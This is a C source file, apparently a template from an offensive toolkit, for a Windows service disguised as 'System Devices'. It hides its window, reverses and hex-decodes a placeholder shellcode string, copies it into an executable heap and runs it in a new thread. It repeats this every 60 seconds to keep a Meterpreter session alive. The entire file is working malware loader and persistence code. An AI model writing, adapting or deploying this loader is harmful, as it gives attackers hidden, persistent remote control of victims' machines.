#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#define SERVICE_NAME     "System Devices"
#define RETRY_TIME       60
#pragma comment(linker, "/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
//
// Globals
//

SERVICE_STATUS status;
SERVICE_STATUS_HANDLE hStatus;


void StringToHex(char *str, unsigned char *out) {
    char *p = str;
    char high = 0, low = 0;
    int tmplen = strlen(p);
    int cnt = 0;
    tmplen = strlen(p);
    while (cnt < (tmplen / 2)) {
        high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
        low = (*(++p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p) - 48 - 7 : *(p) - 48;
        out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
        p++;
        cnt++;
    }
    if (tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
    return;
}

void fakerun(void* buffer) {
    void(*function)();
    function = (void(*)())buffer;
    function();
}

void hardCodeMeter() {
    char buffer[] = "{{SHELLCODE_STR}}";
    _strrev(buffer);
    unsigned char hexbuffer[409600] = { 0 };

    StringToHex(buffer, hexbuffer);

    LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ptr = HeapAlloc(heapp, 0, sizeof(hexbuffer));
    RtlMoveMemory(ptr, hexbuffer, sizeof(hexbuffer));
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(fakerun), ptr, 0, NULL);
    WaitForSingleObject(hThread, -1); //INFINITE
    CloseHandle(hThread);
}

//
// Call self without parameter to start meterpreter
//

void self_call() {
    char path[MAX_PATH];
    char cmd[MAX_PATH];

    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        // Get module file name failed
        return;
    }

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_information;

    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);

    ZeroMemory(&process_information, sizeof(process_information));

    // If create process failed.
    // CREATE_NO_WINDOW = 0x08000000
    if (CreateProcess(path, path, NULL, NULL, TRUE, 0x08000000, NULL,
                      NULL, &startup_info, &process_information) == 0) {
        return;
    }

    // Wait until the process died.
    WaitForSingleObject(process_information.hProcess, -1);
}

//
// Process control requests from the Service Control Manager
//

VOID WINAPI ServiceCtrlHandler(DWORD fdwControl) {
    switch (fdwControl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_STOPPED;
            break;

        case SERVICE_CONTROL_PAUSE:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_PAUSED;
            break;

        case SERVICE_CONTROL_CONTINUE:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_RUNNING;
            break;

        default:
            break;
    }

    if (SetServiceStatus(hStatus, &status) == 0) {
        //printf("Cannot set service status (0x%08x)", GetLastError());
        exit(1);
    }

    return;
}


//
// Main function of service
//

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv) {
    // Register the service handler

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (hStatus == 0) {
        //printf("Cannot register service handler (0x%08x)", GetLastError());
        exit(1);
    }

    // Initialize the service status structure

    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    status.dwWin32ExitCode = 0;
    status.dwServiceSpecificExitCode = 0;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;

    if (SetServiceStatus(hStatus, &status) == 0) {
        //printf("Cannot set service status (0x%08x)", GetLastError());
        return;
    }

    // Start the Meterpreter run as guard
    while (status.dwCurrentState == SERVICE_RUNNING) {
        hardCodeMeter();
        Sleep(RETRY_TIME);
    }

    return;
}

//
// Main function
//

void main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] =
            {
                    {SERVICE_NAME, &ServiceMain},
                    {NULL, NULL}
            };

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
        exit(1);
    }
}
